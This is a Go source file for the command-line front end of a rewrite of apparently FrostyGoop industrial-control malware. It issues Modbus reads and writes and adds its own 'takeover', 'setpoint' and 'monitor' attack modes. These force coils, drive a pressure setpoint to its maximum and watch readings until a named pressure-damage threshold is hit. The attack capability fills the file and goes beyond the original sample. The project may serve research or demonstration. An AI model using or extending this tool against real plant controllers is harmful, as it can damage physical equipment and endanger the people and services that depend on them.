// Command frostygoop is the rewrite's CLI. The flag set tracks the sample's
// main.Cmd so the two can be compared directly; the extra -mode values are
// where our added capability shows up at the interface level.
package main

import (
	"flag"
	"fmt"
	"math"
	"net"
	"os"
	"strings"
	"time"

	"github.com/abb00717/frostygoop-rewrite/internal/attack"
	"github.com/abb00717/frostygoop-rewrite/internal/modbus"
)

// Modes fall into two tiers. The primitives issue exactly one function code,
// matching how the sample's mode string picked a Code. The sequences run a
// prechecked, verified, rollback-capable series and are ours alone.
//
//	read        FC03    sample
//	write       FC06    sample
//	write-m     FC16    sample
//	read-coil   FC01    added
//	read-input  FC04    added
//	write-coil  FC05    added
//	takeover    attack.CoilTakeover      added, FC01+FC05+FC16
//	setpoint    attack.PressureSetpoint  added, FC03+FC06
//	monitor     attack.PressureMonitor   added, FC04
//
// The sample rows are confirmed by the hand-checked Ghidra review, see
// team/RE_MEASUREMENT.md. That review also confirmed the sample answered any
// unrecognized mode with FC03. We deliberately error instead: on stage, a
// mistyped mode that quietly performs a read is worse than one that stops.
type config struct {
	ip      string
	port    int
	mode    string
	unitID  uint
	address uint
	value   uint
	count   uint
	threads int
	timeout time.Duration
	try     int
	output  string
	debug   bool

	// Sequence modes take their target from a dedicated flag instead of -value.
	// Sharing -value would mean running a sequence bare used its zero default,
	// which for pressure_sp drives the plant the opposite way and still reads
	// back clean.
	f1         uint
	f2         uint
	purge      uint
	product    uint
	pressureSP uint

	monitorEvery time.Duration
	monitorFor   time.Duration
	monitorStop  float64
}

func parseFlags() *config {
	c := &config{}
	flag.StringVar(&c.ip, "ip", "", "target host or host:port")
	flag.IntVar(&c.port, "port", 502, "modbus tcp port")
	flag.StringVar(&c.mode, "mode", "read", "operation, see the mode table")
	flag.UintVar(&c.unitID, "unit-id", 1, "modbus unit id")
	flag.UintVar(&c.address, "address", 0, "register or coil address")
	flag.UintVar(&c.value, "value", 0, "value to write")
	flag.UintVar(&c.count, "count", 1, "how many to read")
	// Accepted so the flag set still lines up with the sample's main.Cmd. The
	// rewrite drives one target per invocation and never reads it.
	flag.IntVar(&c.threads, "threads", 3, "worker count (sample parity, unused)")
	flag.DurationVar(&c.timeout, "timeout", 10*time.Second, "per-request timeout")
	flag.IntVar(&c.try, "try", 3, "retries per request")
	flag.StringVar(&c.output, "output", "", "write the JSON result here")
	flag.BoolVar(&c.debug, "debug", false, "log frames as hex")
	flag.UintVar(&c.f1, "f1", 65535, "takeover f1 manual setpoint")
	flag.UintVar(&c.f2, "f2", 65535, "takeover f2 manual setpoint")
	flag.UintVar(&c.purge, "purge", 0, "takeover purge manual setpoint")
	flag.UintVar(&c.product, "product", 0, "takeover product manual setpoint")
	flag.UintVar(&c.pressureSP, "pressure-sp", attack.PressureSPMax, "setpoint mode target for pressure_sp")
	flag.DurationVar(&c.monitorEvery, "monitor-every", time.Second, "monitor mode poll interval")
	flag.DurationVar(&c.monitorFor, "monitor-for", time.Minute, "monitor mode run length")
	flag.Float64Var(&c.monitorStop, "monitor-stop-kpa", attack.PressureDamageKPa, "monitor mode exits at this reading, 0 to run the full duration")
	flag.Parse()
	return c
}

// wordFlags are the flags that end up as uint16 on the wire. Converting an
// out-of-range value silently wraps it, so -count 65537 would read one
// register while looking like it asked for tens of thousands.
func (c *config) wordFlags() []struct {
	name  string
	value uint
} {
	return []struct {
		name  string
		value uint
	}{
		{"address", c.address},
		{"value", c.value},
		{"count", c.count},
		{"f1", c.f1},
		{"f2", c.f2},
		{"purge", c.purge},
		{"product", c.product},
		{"pressure-sp", c.pressureSP},
	}
}

func main() {
	os.Exit(run())
}

func run() int {
	c := parseFlags()

	if strings.TrimSpace(c.ip) == "" {
		fmt.Fprintln(os.Stderr, "-ip is required")
		return 2
	}
	if c.unitID > 255 {
		fmt.Fprintln(os.Stderr, "-unit-id must be 0..255")
		return 2
	}
	if c.port <= 0 || c.port > 65535 {
		fmt.Fprintln(os.Stderr, "-port must be 1..65535")
		return 2
	}
	for _, f := range c.wordFlags() {
		if f.value > math.MaxUint16 {
			fmt.Fprintf(os.Stderr, "-%s must be 0..65535\n", f.name)
			return 2
		}
	}

	addr := normalizeAddress(c.ip, c.port)
	conn, err := modbus.Dial(addr, modbus.Options{
		Timeout: c.timeout,
		Retries: c.try,
		UnitID:  byte(c.unitID),
		Debug:   c.debug,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "dial %s: %v\n", addr, err)
		return 1
	}
	defer conn.Close()

	result, err := executeMode(conn, c)
	if c.output != "" && result != nil {
		if wErr := result.WriteJSON(c.output); wErr != nil {
			fmt.Fprintf(os.Stderr, "write output %s: %v\n", c.output, wErr)
			return 1
		}
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "%s failed: %v\n", c.mode, err)
		return 1
	}

	fmt.Printf("%s success\n", c.mode)
	return 0
}

func executeMode(conn *modbus.Conn, c *config) (*attack.Result, error) {
	switch c.mode {
	case "read":
		values, err := conn.ReadHolding(uint16(c.address), uint16(c.count))
		return singleStepResult("read holding", 0x03, uint16(c.address), values, err), err
	case "write":
		err := conn.WriteSingle(uint16(c.address), uint16(c.value))
		return singleStepResult("write single register", 0x06, uint16(c.address), []uint16{uint16(c.value)}, err), err
	case "write-m":
		vals := make([]uint16, c.count)
		for i := range vals {
			vals[i] = uint16(c.value)
		}
		err := conn.WriteMultiple(uint16(c.address), vals)
		return singleStepResult("write multiple registers", 0x10, uint16(c.address), vals, err), err
	case "read-coil":
		coils, err := conn.ReadCoils(uint16(c.address), uint16(c.count))
		return singleStepResult("read coils", 0x01, uint16(c.address), boolSliceToWords(coils), err), err
	case "read-input":
		values, err := conn.ReadInput(uint16(c.address), uint16(c.count))
		return singleStepResult("read input registers", 0x04, uint16(c.address), values, err), err
	case "write-coil":
		on := c.value != 0
		err := conn.WriteCoil(uint16(c.address), on)
		return singleStepResult("write coil", 0x05, uint16(c.address), []uint16{boolToWord(on)}, err), err
	case "takeover":
		return attack.CoilTakeover(conn, uint16(c.f1), uint16(c.f2), uint16(c.purge), uint16(c.product))
	case "setpoint":
		return attack.PressureSetpoint(conn, uint16(c.pressureSP))
	case "monitor":
		return attack.PressureMonitor(conn, attack.MonitorOptions{
			Every:     c.monitorEvery,
			For:       c.monitorFor,
			StopAtKPa: c.monitorStop,
			Out:       os.Stdout,
		})
	default:
		err := fmt.Errorf("unknown mode %q", c.mode)
		return singleStepResult("unknown mode", 0x00, 0, nil, err), err
	}
}

func singleStepResult(name string, fc byte, addr uint16, value []uint16, err error) *attack.Result {
	step := attack.Step{Name: name, FC: fc, Addr: addr, Value: value}
	if err != nil {
		step.Err = err.Error()
	}
	return &attack.Result{Steps: []attack.Step{step}, Success: err == nil}
}

func boolSliceToWords(values []bool) []uint16 {
	out := make([]uint16, len(values))
	for i, v := range values {
		out[i] = boolToWord(v)
	}
	return out
}

func boolToWord(on bool) uint16 {
	if on {
		return 1
	}
	return 0
}

func normalizeAddress(host string, port int) string {
	if _, _, err := net.SplitHostPort(host); err == nil {
		return host
	}
	return net.JoinHostPort(host, fmt.Sprintf("%d", port))
}

